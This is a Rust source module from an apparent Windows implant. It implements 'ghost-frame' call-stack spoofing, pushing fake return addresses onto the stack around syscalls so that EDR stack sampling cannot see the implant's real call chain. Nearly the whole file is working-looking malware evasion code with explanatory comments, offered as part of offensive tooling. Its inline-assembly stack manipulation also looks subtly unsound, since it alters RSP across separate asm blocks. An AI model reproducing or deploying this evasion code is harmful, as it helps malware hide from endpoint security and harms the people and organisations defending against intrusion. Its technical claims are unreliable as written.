//! LACUNA ghost-frame stack injection — BYOUD-Gap leaf frame spoofing.
//!
//! Injects ghost return addresses onto the stack before sensitive syscalls
//! so that EDR call-stack sampling (via RtlVirtualUnwind / ETW STACKWALK)
//! sees a chain of .pdata lacuna addresses instead of the implant's real
//! call chain. Each ghost address, when processed by the unwinder, returns
//! NULL from RtlLookupFunctionEntry → treated as leaf frame → RSP += 8.
//!
//! ## How it works
//! Before a syscall:
//!   [real return addr]     ← what EDR would normally see
//!   [ghost_frame_N]        ← fake (win32u NOP gap)
//!   ...
//!   [ghost_frame_0]        ← fake (ntdll exception anchor)
//!   [syscall return addr]  ← real, points back to implant
//!   ─── RSP ───
//!
//! After the syscall returns, the ghost frames are popped off the stack
//! and execution continues normally. The ghost frames are ONLY present
//! during the syscall window when EDR might sample the stack.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use crate::lacuna::GhostChain;
use core::arch::asm;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

/// Cached ghost chain built at bootstrap. `0` = not yet scanned.
static CHAIN_FRAMES: AtomicUsize = AtomicUsize::new(0);
static CHAIN_LEN: AtomicUsize = AtomicUsize::new(0);
static CHAIN_READY: AtomicBool = AtomicBool::new(false);

/// Install a ghost chain for stack injection. Called at bootstrap after
/// LACUNA scanning. `frames` is leaked into a static — lives for the
/// process lifetime (implant never tears down).
pub fn install_ghost_chain(chain: &GhostChain) {
    if chain.frames.is_empty() {
        return;
    }
    let len = chain.frames.len();
    // Allocate a static buffer for the frames.
    let buf: &'static mut [usize] = {
        let v: Vec<usize> = Vec::with_capacity(len);
        let ptr = v.as_ptr() as *mut usize;
        core::mem::forget(v); // ownership transferred to static
        unsafe { core::slice::from_raw_parts_mut(ptr, len) }
    };
    buf.copy_from_slice(&chain.frames);
    CHAIN_FRAMES.store(buf.as_ptr() as usize, Ordering::Release);
    CHAIN_LEN.store(len, Ordering::Release);
    CHAIN_READY.store(true, Ordering::Release);
}

/// Execute `closure` with ghost frames injected onto the stack.
/// While `closure` runs, EDR stack sampling will see the ghost chain
/// instead of the real call stack.
///
/// # Safety
/// `closure` must not unwind (panic/exception) while ghost frames are
/// on the stack — the stack would be corrupted.
///
/// This function uses inline assembly to push ghost frames, call the
/// closure, then pop them. No heap allocation, no function pointers
/// through CFG — direct stack manipulation via `asm!`.
#[inline(never)]
pub unsafe fn with_ghost_stack<F: FnOnce()>(f: F) {
    if !CHAIN_READY.load(Ordering::Acquire) {
        f();
        return;
    }

    let frames_ptr = CHAIN_FRAMES.load(Ordering::Acquire) as *const usize;
    let frames_len = CHAIN_LEN.load(Ordering::Acquire);

    if frames_ptr.is_null() || frames_len == 0 {
        f();
        return;
    }

    // Push ghost frames in reverse order onto the stack.
    // The unwinder walks from low to high addresses, so the FIRST
    // ghost it encounters should be the last one we push.
    for i in (0..frames_len).rev() {
        let addr = core::ptr::read(frames_ptr.add(i));
        asm!(
            "push {}",
            in(reg) addr,
        );
    }

    // Execute the closure. During its execution, the stack has ghost
    // frames between the closure's frame and the caller's frame.
    f();

    // Pop ghost frames off the stack (restore RSP).
    // Each frame is 8 bytes on x64.
    let pop_bytes = frames_len * 8;
    asm!(
        "add rsp, {}",
        in(reg) pop_bytes,
    );
}
